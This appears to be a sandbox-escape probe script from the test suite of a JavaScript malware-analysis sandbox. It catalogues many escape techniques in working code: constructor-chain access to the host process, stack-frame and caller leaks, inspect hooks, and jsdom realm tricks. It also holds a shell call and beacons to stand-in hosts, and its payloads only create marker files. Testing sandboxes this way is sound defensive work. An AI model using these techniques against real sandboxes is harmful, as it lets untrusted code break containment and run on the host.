// Sandbox-escape probe used by test/sandbox-escape.js. __MARK__ is replaced with an absolute
// path outside the results dir. Every attempt logs http://attempted.example/<name> first, so
// the test can tell "blocked" from "never ran"; a working escape logs
// http://escaped.example/<name> and creates __MARK__.<name> through the host's real fs.
var MARK = "__MARK__";
function url(u) {
  try { var x = new ActiveXObject("MSXML2.XMLHTTP"); x.open("GET", u, false); x.send(); } catch (e) {}
}
function hit(name) { url("http://escaped.example/" + name); }
function isProc(p) {
  try { return !!p && typeof p.pid === "number" && typeof p.exit === "function"; } catch (e) { return false; }
}
function useProc(name, p) {
  if (!isProc(p)) return;
  hit(name);
  try {
    var fsm = typeof p.getBuiltinModule === "function" ? p.getBuiltinModule("fs") : p.mainModule.require("fs");
    fsm.writeFileSync(MARK + "." + name, "x");
  } catch (e) {}
}
function useReq(name, r) {
  if (typeof r !== "function") return;
  var cp, fsm;
  try { cp = r("child_process"); } catch (e) {}
  try { if (cp && typeof cp.execFileSync === "function") { cp.execFileSync("sh", ["-c", ": > '" + MARK + "." + name + "-cp'"]); } } catch (e) {}
  try { fsm = r("fs"); } catch (e) {}
  try { if (fsm && typeof fsm.readFileSync === "function" && fsm.readFileSync("/proc/self/status")) { hit(name + "-fsread"); } } catch (e) {}
  try { if (fsm && typeof fsm.openSync === "function") { fsm.closeSync(fsm.openSync(MARK + "." + name + "-fs", "w")); hit(name + "-fs"); } } catch (e) {}
  // A member only the real module has (require_override.js hands out stubs for some ids).
  var real = {
    vm: "runInThisContext", module: "createRequire", worker_threads: "Worker", inspector: "Session",
    v8: "setFlagsFromString", net: "isIP", http: "globalAgent", https: "globalAgent",
    dgram: "createSocket", dns: "lookup", tls: "connect", zlib: "inflateSync",
    child_process: "execFileSync", fs: "openSync", os: "setPriority",
  };
  Object.keys(real).forEach(function (m) {
    ["", "node:"].forEach(function (pre) {
      try { var mod = r(pre + m); if (mod && mod[real[m]] !== undefined) hit(name + "-" + pre + m); } catch (e) {}
    });
  });
  try { useProc(name + "-process", r("process")); } catch (e) {}
  try { var v = r("vm"); if (v && v.runInThisContext) useProc(name + "-vm", v.runInThisContext("process")); } catch (e) {}
  try { var c = r("crypto"); if (c && typeof c.setEngine === "function") hit(name + "-setEngine"); } catch (e) {}
}
function attempt(name, fn) {
  url("http://attempted.example/" + name);
  try { fn(); } catch (e) {}
}
var Q = "typeof process !== 'undefined' ? process : undefined";
function viaRealm(name, o) {
  // A foreign realm's global (a jsdom window) carries its own eval/Function.
  try { if (o && typeof o.eval === "function") useProc(name + "-eval", o.eval(Q)); } catch (e) {}
  try { if (o && typeof o.Function === "function") useProc(name + "-Function", o.Function("return " + Q)()); } catch (e) {}
  try { if (o && o.defaultView) viaRealm(name + "-defaultView", o.defaultView); } catch (e) {}
  try { if (o && o.ownerDocument && o.ownerDocument.defaultView) viaRealm(name + "-ownerDocument", o.ownerDocument.defaultView); } catch (e) {}
}
function fromCtor(name, o) {
  viaRealm(name, o);
  try { useProc(name, o.constructor.constructor("return process")()); } catch (e) {}
  try { useProc(name + "-own", o.constructor("return process")()); } catch (e) {}
  try { useProc(name + "-proto", Object.getPrototypeOf(o).constructor.constructor("return process")()); } catch (e) {}
}

attempt("global-process", function () { if (typeof process !== "undefined") useProc("global-process", process); });
attempt("global-require", function () { if (typeof require !== "undefined") useReq("global-require", require); });
attempt("orig-require", function () { if (typeof _origRequire !== "undefined") useReq("orig-require", _origRequire); });
attempt("this-require", function () { useReq("this-require", this.require); useReq("globalThis-require", globalThis.require); });
attempt("module-require", function () { if (typeof module !== "undefined" && module) useReq("module-require", module.require); });
attempt("this-ctor", function () { fromCtor("this-ctor", this); fromCtor("globalThis-ctor", globalThis); });
attempt("require-ctor", function () { if (typeof require !== "undefined") fromCtor("require-ctor", require); });
attempt("lib", function () {
  if (typeof lib === "undefined") return;
  fromCtor("lib-ctor", lib);
  fromCtor("lib-fn-ctor", lib.logIOC);
  try { lib.argv.download = true; } catch (e) {}
  try { if (lib.argv && lib.argv.download === true) hit("lib-argv-mutable"); } catch (e) {}
  try { if (typeof lib.throttleFileWrites === "function" || typeof lib.throttleCommands === "function") hit("lib-throttle-toggle"); } catch (e) {}
});
attempt("emulated-objects", function () {
  fromCtor("wscript-ctor", WScript);
  fromCtor("activex-ctor", ActiveXObject);
  fromCtor("activex-inst-ctor", new ActiveXObject("WScript.Shell"));
  fromCtor("activex-method-ctor", new ActiveXObject("WScript.Shell").Run);
  if (typeof location !== "undefined") fromCtor("location-ctor", location);
  if (typeof document !== "undefined") fromCtor("document-ctor", document);
  if (typeof console !== "undefined") fromCtor("console-ctor", console.log);
  if (typeof eval !== "undefined") fromCtor("eval-ctor", eval);
  if (typeof setTimeout !== "undefined") fromCtor("timer-ctor", setTimeout(function () {}, 0));
});
attempt("buffer", function () {
  if (typeof Buffer === "undefined") return;
  fromCtor("buffer-ctor", Buffer);
  fromCtor("buffer-inst-ctor", Buffer.from("x"));
});
attempt("async-ctor", function () { fromCtor("async-ctor", (async function () {})); });
attempt("host-error", function () {
  try { WScript.Sleep({ valueOf: function () { throw new Error("x"); } }); } catch (e) { fromCtor("sandbox-error", e); }
  try { new ActiveXObject("No.Such.Object.Zzz"); } catch (e) { fromCtor("activex-error", e); }
  try { lib.logResource(null, null, null); } catch (e) { fromCtor("lib-error", e); }
  try { require("\u0000nope"); } catch (e) { fromCtor("require-error", e); }
});
attempt("stack-frames", function () {
  var orig = Error.prepareStackTrace;
  Error.prepareStackTrace = function (e, frames) { return frames; };
  function probe(frames) {
    if (!frames || typeof frames.forEach !== "function") return;
    frames.forEach(function (f, i) {
      try { var t = f.getThis(); if (t) fromCtor("frame-this-" + i, t); } catch (e) {}
      try { var fn = f.getFunction(); if (fn) fromCtor("frame-fn-" + i, fn); } catch (e) {}
    });
  }
  try { probe(new Error().stack); } catch (e) {}
  try { lib.logIOC("x", { toString: function () { probe(new Error().stack); return ""; } }, "y"); } catch (e) {}
  try { WScript.Echo({ toString: function () { probe(new Error().stack); return ""; } }); } catch (e) {}
  Error.prepareStackTrace = orig;
});
attempt("caller", function () {
  function grab() { try { var c = grab.caller; if (c) fromCtor("caller", c); } catch (e) {} return ""; }
  try { WScript.Echo({ toString: grab }); } catch (e) {}
  try { [3, 1, 2].sort(function (a, b) { grab(); return a - b; }); } catch (e) {}
});
attempt("inspect-custom", function () {
  var o = {};
  o[Symbol.for("nodejs.util.inspect.custom")] = function (d, opts, inspect) {
    if (inspect) fromCtor("inspect-fn", inspect);
    if (opts && opts.stylize) fromCtor("inspect-stylize", opts.stylize);
    return "o";
  };
  try { console.log(o); } catch (e) {}
});
attempt("host-proxy", function () {
  if (typeof location !== "undefined") { try { fromCtor("location-proto", Object.getPrototypeOf(location)); } catch (e) {} }
  if (typeof event !== "undefined") { try { fromCtor("event-ctor", event); fromCtor("event-fn", event.preventDefault); } catch (e) {} }
});
attempt("dynamic-eval", function () {
  try { useProc("eval-process", eval("typeof process !== 'undefined' ? process : undefined")); } catch (e) {}
  try { useProc("function-process", Function("return typeof process !== 'undefined' ? process : undefined")()); } catch (e) {}
  try { useReq("eval-require", eval("typeof require !== 'undefined' ? require : undefined")); } catch (e) {}
});
attempt("every-global", function () {
  // Every value the host put in the sandbox, and one level below it.
  Object.getOwnPropertyNames(globalThis).forEach(function (k) {
    var v;
    try { v = globalThis[k]; } catch (e) { return; }
    if (v === null || (typeof v !== "object" && typeof v !== "function")) return;
    fromCtor("g-" + k, v);
    var inner = [];
    try { inner = Object.getOwnPropertyNames(v).slice(0, 200); } catch (e) {}
    inner.forEach(function (j) {
      var w;
      try { w = v[j]; } catch (e) { return; }
      if (w !== null && (typeof w === "object" || typeof w === "function")) fromCtor("g-" + k + "." + j, w);
    });
  });
});
attempt("jsdom", function () {
  if (typeof dom === "undefined" || !dom) return;
  try { fromCtor("dom-window", dom.window); } catch (e) {}
  try { useProc("dom-window-Function", dom.window.Function("return typeof process !== 'undefined' ? process : undefined")()); } catch (e) {}
  try { useProc("dom-window-eval", dom.window.eval("typeof process !== 'undefined' ? process : undefined")); } catch (e) {}
  try {
    var el = dom.window.document.createElement("div");
    fromCtor("dom-el", el);
    Object.getOwnPropertySymbols(el).forEach(function (s, i) { try { fromCtor("dom-el-sym-" + i, el[s]); } catch (e) {} });
  } catch (e) {}
  try {
    var del = document.createElement("div");
    Object.getOwnPropertySymbols(del).forEach(function (s, i) { try { fromCtor("doc-el-sym-" + i, del[s]); } catch (e) {} });
  } catch (e) {}
  try { viaRealm("document", document); viaRealm("document-el", document.createElement("div")); } catch (e) {}
  try { if (typeof dom.getInternalVMContext === "function") hit("dom-vmcontext"); } catch (e) {}
});
url("http://attempted.example/done");
